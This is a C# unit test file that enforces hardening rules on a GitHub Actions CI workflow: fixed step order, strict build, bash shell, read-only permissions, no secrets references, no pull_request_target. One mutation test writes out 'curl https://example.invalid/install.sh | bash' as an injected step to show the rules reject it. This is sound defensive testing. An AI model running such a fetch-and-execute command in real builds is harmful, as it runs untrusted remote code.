using AgentJoules.TestSupport;

using Xunit;

namespace AgentJoules.UnitTests;

/// <summary>
/// AJ-038 (REQ-024): <c>.github/workflows/ci.yml</c> holds every string of criteria 1 and 2 and the shape of criteria 3 and 4. The positive tests
/// read the real file (repository root found by walking up to <c>global.json</c>); the negative tests run the same <see cref="CiWorkflowRules"/>
/// against modified copies of the text and never write a file. The local run of the restore, build and test commands is criterion 6, measured by
/// the battery and recorded in docs/build-log.md, not from inside the running test host.
/// </summary>
[Trait("Spec", "REQ-024")]
public sealed class CiWorkflowTests
{
    private const string StrictlessBuild = "dotnet build -tl:off --no-incremental --no-restore";

    private static string Text() => CiWorkflowRules.ReadWorkflowText();

    // The text with oldValue replaced by newValue; oldValue must be there, so a mutation that no longer applies fails loudly.
    private static string Mutate(string text, string oldValue, string newValue)
    {
        Assert.Contains(oldValue, text, StringComparison.Ordinal);
        return text.Replace(oldValue, newValue, StringComparison.Ordinal);
    }

    [Fact]
    public void Workflow_runs_on_the_windows_and_ubuntu_runners()
    {
        Assert.Empty(CiWorkflowRules.Missing(Text(), "windows-latest", "ubuntu-latest", "runs-on: ${{ matrix.os }}"));
    }

    [Fact]
    public void Build_step_is_the_strict_build_command()
    {
        string text = Text();

        Assert.Empty(CiWorkflowRules.Missing(text, "dotnet build -warnaserror -tl:off"));
        Assert.Empty(CiWorkflowRules.BuildStepViolations(text));
    }

    [Fact]
    public void Test_step_is_dotnet_test_without_a_build()
    {
        string text = Text();

        Assert.Empty(CiWorkflowRules.Missing(text, "dotnet test"));
        Assert.Contains(CiWorkflowRules.TestCommand, CiWorkflowRules.Steps(text).SelectMany(step => step.Run));
        Assert.Empty(CiWorkflowRules.LocalCommandViolations(text));
    }

    [Fact]
    public void Probe_step_runs_the_probe_json_command_through_tee()
    {
        string text = Text();

        Assert.Empty(CiWorkflowRules.Missing(text, "probe --json"));
        CiWorkflowStep probe = Assert.Single(CiWorkflowRules.Steps(text), step => step.Run.Contains(CiWorkflowRules.ProbeCommand));
        Assert.Equal(CiWorkflowRules.ProbeCommand, probe.Run[0]);
        Assert.Contains("| tee probe.json", probe.Run[0], StringComparison.Ordinal);
    }

    [Fact]
    public void Probe_step_declares_bash_and_requires_the_no_gpu_answer()
    {
        string text = Text();

        CiWorkflowStep probe = Assert.Single(CiWorkflowRules.Steps(text), step => step.Run.Contains(CiWorkflowRules.ProbeCheck));
        Assert.Equal("bash", probe.Shell);
        Assert.Contains("\"gpuPresent\": *false", probe.Run[1], StringComparison.Ordinal);
        Assert.Empty(CiWorkflowRules.ProbeStepViolations(text));
    }

    [Fact]
    public void Probe_step_lookup_finds_the_step_with_exactly_the_two_probe_lines()
    {
        CiWorkflowStep? probe = CiWorkflowRules.ProbeStep(Text());

        Assert.NotNull(probe);
        Assert.Equal([CiWorkflowRules.ProbeCommand, CiWorkflowRules.ProbeCheck], probe.Run);
    }

    [Fact]
    public void Every_run_step_runs_under_bash()
    {
        string text = Text();

        Assert.Contains(CiWorkflowRules.Steps(text), step => step.Run.Count > 0);
        Assert.Empty(CiWorkflowRules.ShellViolations(text));
        Assert.Empty(CiWorkflowRules.ShellValueViolations(text));
    }

    [Fact]
    public void Workflow_has_no_secrets_reference()
    {
        Assert.Empty(CiWorkflowRules.SecretReferences(Text()));
    }

    [Fact]
    public void Workflow_has_no_secrets_word_in_any_case()
    {
        Assert.Empty(CiWorkflowRules.SecretContextReferences(Text()));
    }

    [Fact]
    public void Workflow_has_no_pull_request_target()
    {
        Assert.Empty(CiWorkflowRules.PullRequestTargetReferences(Text()));
    }

    [Fact]
    public void Checkout_uses_the_v4_action()
    {
        Assert.Contains(CiWorkflowRules.Steps(Text()), step => step.Uses == "actions/checkout@v4");
    }

    [Fact]
    public void Checkout_does_not_leave_the_job_token_in_git_config()
    {
        string text = Text();

        CiWorkflowStep checkout = Assert.Single(CiWorkflowRules.Steps(text), step => step.Uses == "actions/checkout@v4");
        Assert.Equal("false", checkout.With["persist-credentials"]);
        Assert.Empty(CiWorkflowRules.CheckoutViolations(text));
    }

    [Fact]
    public void Setup_dotnet_v6_reads_the_sdk_version_from_global_json()
    {
        string text = Text();

        CiWorkflowStep setup = Assert.Single(CiWorkflowRules.Steps(text), step => step.Uses == "actions/setup-dotnet@v6");
        Assert.Equal("global.json", setup.With["global-json-file"]);
        Assert.Empty(CiWorkflowRules.SetupDotnetViolations(text));
    }

    [Fact]
    public void Steps_run_in_the_order_of_criterion_2()
    {
        Assert.Empty(CiWorkflowRules.StepOrderViolations(Text()));
    }

    [Theory]
    [InlineData(0, "actions/checkout@v4")]
    [InlineData(1, "actions/setup-dotnet@v6")]
    [InlineData(2, "dotnet restore")]
    [InlineData(3, "dotnet build -warnaserror -tl:off --no-incremental --no-restore")]
    [InlineData(4, "dotnet format --verify-no-changes --no-restore")]
    [InlineData(5, "dotnet test --no-build")]
    [InlineData(6, "dotnet run --project src/AgentJoules.Cli --no-build -- probe --json | tee probe.json")]
    [InlineData(7, "git grep -nE \"nvapi-[A-Za-z0-9_-]{8,}\" && exit 1 || exit 0")]
    public void Step_order_holds_the_criterion_2_string_at_its_position(int position, string expected)
    {
        List<CiWorkflowStep> steps = CiWorkflowRules.Steps(Text());

        Assert.Equal(8, steps.Count);
        Assert.Equal(expected, steps[position].Uses ?? steps[position].Run[0]);
    }

    [Fact]
    public void Key_pattern_scan_is_the_last_step()
    {
        List<CiWorkflowStep> steps = CiWorkflowRules.Steps(Text());

        Assert.Equal(CiWorkflowRules.KeyScanCommand, steps[^1].Run[0]);
    }

    [Fact]
    public void Steps_carry_only_the_allowed_keys()
    {
        string text = Text();

        Assert.Empty(CiWorkflowRules.StepKeyViolations(text));
        CiWorkflowStep checkout = Assert.Single(CiWorkflowRules.Steps(text), step => step.Uses == "actions/checkout@v4");
        Assert.Equal(["name", "uses", "with"], checkout.Keys);
    }

    [Fact]
    public void Run_steps_have_one_command_line_and_the_probe_step_has_two()
    {
        string text = Text();

        Assert.Empty(CiWorkflowRules.RunStyleViolations(text));
        Assert.All(
            CiWorkflowRules.Steps(text).Where(step => step.Run.Count > 0 && step.Line != CiWorkflowRules.ProbeStep(text)?.Line),
            step => Assert.Single(step.Run));
    }

    [Fact]
    public void Permissions_are_contents_read_at_workflow_level()
    {
        Assert.Empty(CiWorkflowRules.PermissionsViolations(Text()));
    }

    [Fact]
    public void Workflow_triggers_on_push_and_pull_request()
    {
        string text = Text();

        Assert.Empty(CiWorkflowRules.TriggerViolations(text));
        Assert.Contains("push", CiWorkflowRules.Triggers(text));
        Assert.Contains("pull_request", CiWorkflowRules.Triggers(text));
    }

    [Fact]
    public void Workflow_declares_one_job_and_one_steps_list()
    {
        Assert.Empty(CiWorkflowRules.JobViolations(Text()));
    }

    [Fact]
    public void Job_timeout_is_twenty_minutes()
    {
        Assert.Empty(CiWorkflowRules.TimeoutViolations(Text()));
    }

    [Fact]
    public void Matrix_is_the_exact_pair_of_runners()
    {
        Assert.Empty(CiWorkflowRules.MatrixViolations(Text()));
    }

    [Fact]
    public void Only_the_runs_on_line_holds_an_expression()
    {
        Assert.Empty(CiWorkflowRules.ExpressionViolations(Text()));
    }

    [Fact]
    public void Workflow_has_no_env_if_or_continue_on_error_key()
    {
        Assert.Empty(CiWorkflowRules.ForbiddenKeyViolations(Text()));
    }

    [Fact]
    public void Workflow_satisfies_every_rule()
    {
        Assert.Empty(CiWorkflowRules.Violations(Text()));
    }

    [Fact]
    public void Secret_reference_is_reported_with_its_line_number_and_text()
    {
        string clean = Text();
        string modified = CiWorkflowRules.WithSecretReference(clean);

        Assert.Empty(CiWorkflowRules.SecretReferences(clean));
        string hit = Assert.Single(CiWorkflowRules.SecretReferences(modified));
        int line = CiWorkflowRules.LineOf(modified, CiWorkflowRules.SecretReferenceLine);
        Assert.True(line > 0);
        string offending = $"{line}:{CiWorkflowRules.SecretReferenceLine}";
        Assert.Equal(offending, hit);

        // The one injected line is read by five rules, and by no other.
        Assert.Equal(
            [
                "secrets reference at " + offending,
                "secrets context at " + offending,
                "the job \"build\" has the key \"env\"",
                offending + ": an expression outside the runs-on line",
                "the workflow has 2 expressions, expected exactly 1 (the runs-on line)",
                "the forbidden key \"env:\" at " + offending,
            ],
            CiWorkflowRules.Violations(modified));
    }

    [Fact]
    public void Secret_mutator_injects_a_quoted_flow_mapping_at_the_job_indent()
    {
        string modified = CiWorkflowRules.WithSecretReference(Text());

        // The expression is quoted because an unquoted ${{ }} inside a flow mapping is not valid YAML; actionlint is external, so the text is asserted.
        Assert.Equal("    env: { NVIDIA_API_KEY: '${{ secrets.NVIDIA_API_KEY }}' }", CiWorkflowRules.SecretReferenceLine);
        Assert.Contains("\n" + CiWorkflowRules.SecretReferenceLine + "\n", modified, StringComparison.Ordinal);
        Assert.Contains("\n    timeout-minutes: 20\n" + CiWorkflowRules.SecretReferenceLine + "\n", modified, StringComparison.Ordinal);
    }

    [Fact]
    public void Build_step_without_warnaserror_is_rejected()
    {
        string clean = Text();
        string modified = CiWorkflowRules.WithoutWarningsAsErrors(clean);

        Assert.NotEqual(clean, modified);
        Assert.Empty(CiWorkflowRules.BuildStepViolations(clean));
        string[] order = [.. CiWorkflowRules.StepOrder];
        order[Array.IndexOf(order, CiWorkflowRules.BuildCommand)] = StrictlessBuild;

        // The one changed line is read by three rules: the criterion 1 string, the build command and the step order.
        Assert.Equal(
            [
                "the workflow does not contain \"dotnet build -warnaserror -tl:off\"",
                "a step runs \"" + StrictlessBuild + "\" instead of \"" + CiWorkflowRules.BuildCommand + "\"",
                "the steps are [" + string.Join(" | ", order) + "], expected [" + string.Join(" | ", CiWorkflowRules.StepOrder) + "]",
            ],
            CiWorkflowRules.Violations(modified));
    }

    [Fact]
    public void Pull_request_target_trigger_is_rejected()
    {
        string clean = Text();
        string modified = CiWorkflowRules.WithPullRequestTarget(clean);

        Assert.Empty(CiWorkflowRules.PullRequestTargetReferences(clean));
        string hit = Assert.Single(CiWorkflowRules.PullRequestTargetReferences(modified));
        Assert.EndsWith("  pull_request_target:", hit, StringComparison.Ordinal);
        Assert.Equal(["pull_request_target at " + hit], CiWorkflowRules.Violations(modified));
    }

    [Fact]
    public void Removing_the_format_step_breaks_the_step_order()
    {
        string clean = Text();
        string modified = Mutate(clean, "      - name: Format\n        run: dotnet format --verify-no-changes --no-restore\n\n", string.Empty);

        Assert.NotEqual(clean, modified);
        Assert.Single(CiWorkflowRules.StepOrderViolations(modified));
    }

    [Fact]
    public void Probe_step_without_its_own_bash_shell_is_rejected()
    {
        string modified = Mutate(Text(), "        shell: bash\n        run: |\n", "        run: |\n");
        int probe = CiWorkflowRules.LineOf(modified, "      - name: Probe without a GPU");

        Assert.Equal([$"line {probe}: the probe step does not declare shell: bash"], CiWorkflowRules.ProbeStepViolations(modified));
        Assert.Empty(CiWorkflowRules.ShellViolations(modified));
    }

    [Fact]
    public void A_line_between_tee_and_grep_is_rejected()
    {
        string modified = Mutate(Text(), "| tee probe.json\n          grep -q", "| tee probe.json\n          exit 0\n          grep -q");
        int probe = CiWorkflowRules.LineOf(modified, "      - name: Probe without a GPU");

        Assert.Equal(
            [$"line {probe}: the probe step runs [{CiWorkflowRules.ProbeCommand} | exit 0 | {CiWorkflowRules.ProbeCheck}], expected [{CiWorkflowRules.ProbeCommand} | {CiWorkflowRules.ProbeCheck}]"],
            CiWorkflowRules.ProbeStepViolations(modified));
    }

    [Fact]
    public void A_folded_run_scalar_is_rejected()
    {
        string modified = Mutate(Text(), "        run: dotnet restore\n", "        run: >\n          dotnet restore\n");
        int restore = CiWorkflowRules.LineOf(modified, "      - name: Restore");

        Assert.Equal([$"line {restore}: the step \"Restore\" has a \">\" run scalar, only | is accepted"], CiWorkflowRules.RunStyleViolations(modified));
    }

    [Fact]
    public void A_command_appended_to_the_restore_step_is_rejected()
    {
        string modified = Mutate(
            Text(),
            "        run: dotnet restore\n",
            "        run: |\n          dotnet restore\n          curl https://example.invalid/install.sh | bash\n");
        int restore = CiWorkflowRules.LineOf(modified, "      - name: Restore");

        Assert.Equal([$"line {restore}: the step \"Restore\" has 2 run lines, expected exactly 1"], CiWorkflowRules.RunStyleViolations(modified));
    }

    [Fact]
    public void Continue_on_error_on_the_build_step_is_rejected()
    {
        string modified = Mutate(Text(), "      - name: Build\n        run:", "      - name: Build\n        continue-on-error: true\n        run:");
        int build = CiWorkflowRules.LineOf(modified, "      - name: Build");
        int added = CiWorkflowRules.LineOf(modified, "        continue-on-error: true");

        Assert.Equal([$"line {build}: the step \"Build\" has the key \"continue-on-error\""], CiWorkflowRules.StepKeyViolations(modified));
        Assert.Equal([$"the forbidden key \"continue-on-error:\" at {added}:        continue-on-error: true"], CiWorkflowRules.ForbiddenKeyViolations(modified));
    }

    [Fact]
    public void An_if_condition_on_the_probe_step_is_rejected()
    {
        string modified = Mutate(Text(), "      - name: Probe without a GPU\n", "      - name: Probe without a GPU\n        if: false\n");
        int probe = CiWorkflowRules.LineOf(modified, "      - name: Probe without a GPU");
        int added = CiWorkflowRules.LineOf(modified, "        if: false");

        Assert.Equal([$"line {probe}: the step \"Probe without a GPU\" has the key \"if\""], CiWorkflowRules.StepKeyViolations(modified));
        Assert.Equal([$"the forbidden key \"if:\" at {added}:        if: false"], CiWorkflowRules.ForbiddenKeyViolations(modified));
    }

    [Fact]
    public void An_if_condition_on_the_job_is_rejected()
    {
        string modified = Mutate(Text(), "    timeout-minutes: 20\n", "    timeout-minutes: 20\n    if: false\n");
        int added = CiWorkflowRules.LineOf(modified, "    if: false");

        Assert.Equal([$"the forbidden key \"if:\" at {added}:    if: false"], CiWorkflowRules.ForbiddenKeyViolations(modified));
    }

    [Fact]
    public void A_workflow_level_env_is_rejected()
    {
        string modified = Mutate(Text(), "permissions:\n  contents: read\n", "permissions:\n  contents: read\n\nenv:\n  FEATURE: on\n");
        int added = CiWorkflowRules.LineOf(modified, "env:");

        Assert.Equal([$"the forbidden key \"env:\" at {added}:env:"], CiWorkflowRules.ForbiddenKeyViolations(modified));
    }

    [Fact]
    public void A_job_level_permissions_block_is_rejected()
    {
        string modified = Mutate(Text(), "    timeout-minutes: 20\n", "    timeout-minutes: 20\n    permissions:\n      contents: write\n");

        Assert.Equal(["the workflow has 2 permissions: lines, expected exactly 1"], CiWorkflowRules.PermissionsViolations(modified));
    }

    [Fact]
    public void A_second_expression_is_rejected()
    {
        string modified = Mutate(Text(), "      - name: Test\n", "      - name: Test ${{ matrix.os }}\n");
        int added = CiWorkflowRules.LineOf(modified, "      - name: Test ${{ matrix.os }}");

        Assert.Equal(
            [
                added + ":      - name: Test ${{ matrix.os }}: an expression outside the runs-on line",
                "the workflow has 2 expressions, expected exactly 1 (the runs-on line)",
            ],
            CiWorkflowRules.ExpressionViolations(modified));
    }

    [Theory]
    [InlineData("${{ Secrets.NVIDIA_API_KEY }}")]
    [InlineData("${{ secrets['NVIDIA_API_KEY'] }}")]
    [InlineData("${{ toJSON(secrets) }}")]
    public void Other_spellings_of_the_secrets_context_are_rejected(string spelling)
    {
        string modified = Mutate(Text(), "      - name: Restore\n", "      - name: Restore " + spelling + "\n");
        int added = CiWorkflowRules.LineOf(modified, "      - name: Restore " + spelling);

        // The fixed string secrets. does not see these spellings; the word rule and the expression rule do.
        Assert.Empty(CiWorkflowRules.SecretReferences(modified));
        Assert.Equal([$"{added}:      - name: Restore {spelling}"], CiWorkflowRules.SecretContextReferences(modified));
        Assert.Equal(2, CiWorkflowRules.ExpressionViolations(modified).Count);
        Assert.Contains($"secrets context at {added}:      - name: Restore {spelling}", CiWorkflowRules.Violations(modified));
    }

    [Fact]
    public void A_comment_line_does_not_satisfy_the_matrix_rule()
    {
        string modified = Mutate(
            Text(),
            "        os: [windows-latest, ubuntu-latest]\n",
            "        # os: [windows-latest, ubuntu-latest]\n        os: [windows-latest]\n");

        // The substring check of criterion 1 still passes on the comment; the exact-line rule does not.
        Assert.Empty(CiWorkflowRules.Missing(modified, "windows-latest", "ubuntu-latest"));
        Assert.Equal(["the job's strategy: matrix: is not exactly os: [windows-latest, ubuntu-latest]"], CiWorkflowRules.MatrixViolations(modified));
    }

    [Fact]
    public void A_matrix_exclude_entry_is_rejected()
    {
        string modified = Mutate(
            Text(),
            "        os: [windows-latest, ubuntu-latest]\n",
            "        os: [windows-latest, ubuntu-latest]\n        exclude: [ { os: windows-latest } ]\n");

        Assert.Equal(["the job's strategy: matrix: is not exactly os: [windows-latest, ubuntu-latest]"], CiWorkflowRules.MatrixViolations(modified));
    }

    [Fact]
    public void Job_carries_only_the_allowed_keys()
    {
        Assert.Empty(CiWorkflowRules.JobKeyViolations(Text()));
    }

    [Fact]
    public void A_quoted_job_level_key_is_rejected()
    {
        string continuing = Mutate(Text(), "    timeout-minutes: 20\n", "    timeout-minutes: 20\n    \"continue-on-error\": true\n");
        string conditional = Mutate(Text(), "    timeout-minutes: 20\n", "    timeout-minutes: 20\n    \"if\": false\n");
        int continuingLine = CiWorkflowRules.LineOf(continuing, "    \"continue-on-error\": true");
        int conditionalLine = CiWorkflowRules.LineOf(conditional, "    \"if\": false");

        // The quote hides neither key: the job key set does not contain the quoted spelling, and the forbidden-key rule reads through the quotes.
        Assert.Equal(["the job \"build\" has the key \"\"continue-on-error\"\""], CiWorkflowRules.JobKeyViolations(continuing));
        Assert.Equal([$"the forbidden key \"continue-on-error:\" at {continuingLine}:    \"continue-on-error\": true"], CiWorkflowRules.ForbiddenKeyViolations(continuing));
        Assert.Equal(["the job \"build\" has the key \"\"if\"\""], CiWorkflowRules.JobKeyViolations(conditional));
        Assert.Equal([$"the forbidden key \"if:\" at {conditionalLine}:    \"if\": false"], CiWorkflowRules.ForbiddenKeyViolations(conditional));
    }

    [Fact]
    public void A_plain_scalar_continuation_is_rejected()
    {
        string build = "dotnet build -warnaserror -tl:off --no-incremental --no-restore";
        string joinedBuild = Mutate(Text(), "        run: " + build + "\n", "        run: " + build + "\n          || true\n");
        string joinedTest = Mutate(Text(), "        run: dotnet test --no-build\n", "        run: dotnet test --no-build\n          --filter Category=NoSuchCategory\n");

        // YAML joins the continuation line into the command, so the rules compare the command that would really run.
        Assert.Equal(["a step runs \"" + build + " || true\" instead of \"" + build + "\""], CiWorkflowRules.BuildStepViolations(joinedBuild));
        Assert.Single(CiWorkflowRules.StepOrderViolations(joinedBuild));
        Assert.Equal(
            ["a step runs \"dotnet test --no-build --filter Category=NoSuchCategory\" instead of \"dotnet test --no-build\""],
            CiWorkflowRules.LocalCommandViolations(joinedTest));
        Assert.Single(CiWorkflowRules.StepOrderViolations(joinedTest));
    }

    [Fact]
    public void A_comment_line_does_not_satisfy_the_timeout_rule()
    {
        string modified = Mutate(Text(), "    timeout-minutes: 20\n", "    # timeout-minutes: 20\n    timeout-minutes: 30\n");

        Assert.Equal(["the job does not declare timeout-minutes: 20 at its own indent"], CiWorkflowRules.TimeoutViolations(modified));
    }

    [Fact]
    public void A_second_job_with_another_shell_is_rejected()
    {
        string modified = Text() + "  other:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: pwsh\n    steps:\n      - name: Elsewhere\n        run: echo elsewhere\n";
        int shell = CiWorkflowRules.LineOf(modified, "        shell: pwsh");

        Assert.Equal(
            ["the workflow declares 2 jobs, expected exactly 1", "the workflow has 2 steps: lists, expected exactly 1"],
            CiWorkflowRules.JobViolations(modified));
        Assert.Equal([$"a shell other than bash at {shell}:        shell: pwsh"], CiWorkflowRules.ShellValueViolations(modified));
    }

    [Fact]
    public void A_deeper_comment_before_the_first_step_is_ignored()
    {
        string modified = Mutate(Text(), "    steps:\n      - name: Checkout\n", "    steps:\n            # a note\n      - name: Checkout\n");

        Assert.Equal(8, CiWorkflowRules.Steps(modified).Count);
        Assert.Empty(CiWorkflowRules.Violations(modified));
    }

    [Fact]
    public void Persisting_the_checkout_credentials_is_rejected()
    {
        string persisting = Mutate(Text(), "persist-credentials: false", "persist-credentials: true");
        string absent = Mutate(Text(), "        with:\n          persist-credentials: false\n", string.Empty);

        Assert.Equal(["the checkout step does not set persist-credentials: false"], CiWorkflowRules.CheckoutViolations(persisting));
        Assert.Equal(["the checkout step does not set persist-credentials: false"], CiWorkflowRules.CheckoutViolations(absent));
    }
}